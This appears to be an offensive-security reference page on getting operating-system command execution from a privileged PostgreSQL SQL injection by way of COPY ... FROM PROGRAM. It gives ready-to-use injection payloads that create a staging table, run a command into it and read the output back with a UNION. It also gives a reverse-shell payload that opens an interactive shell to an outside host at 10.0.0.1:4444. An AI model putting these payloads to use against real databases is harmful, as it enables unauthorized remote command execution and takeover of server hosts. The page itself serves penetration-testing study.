---
title: "PostgreSQL command execution with COPY FROM PROGRAM"
description: "Running OS commands from a privileged PostgreSQL injection using COPY ... FROM PROGRAM and reading the output back through a staging table."
keywords:
  - COPY FROM PROGRAM
  - command execution
  - pg_execute_server_program
  - PostgreSQL RCE
---

# COPY FROM PROGRAM

`COPY <table> FROM PROGRAM '<command>'` runs a shell command on the host and loads its standard output into the table, one row per line. It is the quickest command-execution route in PostgreSQL, available from version 9.3, and needs a superuser or the `pg_execute_server_program` role.

Because it loads into a table, the chain is: create a staging table, run the command into it, then read the rows. Stacked queries supply the extra statements:

```sql
'; CREATE TABLE cmd_out(line text); COPY cmd_out FROM PROGRAM 'id'-- 
```

Then read the captured output through any channel, for example a union:

```sql
' UNION SELECT string_agg(line,E'\n'),NULL,NULL FROM cmd_out-- 
```

The command runs as the operating-system account that owns the PostgreSQL server process (commonly `postgres`), with its privileges. For an interactive foothold, run a reverse shell instead of a read-only command:

```sql
'; COPY cmd_out FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'''-- 
```

If stacked queries are unavailable, this route is closed because `COPY` cannot run inside a `SELECT`, so confirm stacking (a created table appears) before relying on it. When the role lacks `pg_execute_server_program` and is not a superuser, fall back to the untrusted-language function route only if superuser is reachable, or stay with data extraction.

## References

- PostgreSQL Documentation: COPY ... FROM PROGRAM, predefined roles
- OWASP Testing Guide: Testing for SQL Injection
